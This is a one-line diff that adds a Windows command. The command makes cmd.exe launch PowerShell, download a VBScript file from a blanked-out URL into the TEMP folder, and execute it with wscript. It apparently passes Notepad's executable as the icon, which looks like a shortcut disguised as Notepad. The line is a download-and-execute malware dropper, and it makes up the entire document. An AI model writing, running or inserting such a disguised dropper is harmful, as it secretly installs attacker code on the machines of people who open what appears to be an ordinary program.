@@ -1,0 +1,1 @@
+"C:\Windows\system32\cmd.exe" -a "/k powershell wget '----' -OutFile $env:TEMP\\1mb.vbs; wscript $env:TEMP\\1mb.vbs" -i "C:\Windows\system32\notepad.exe"
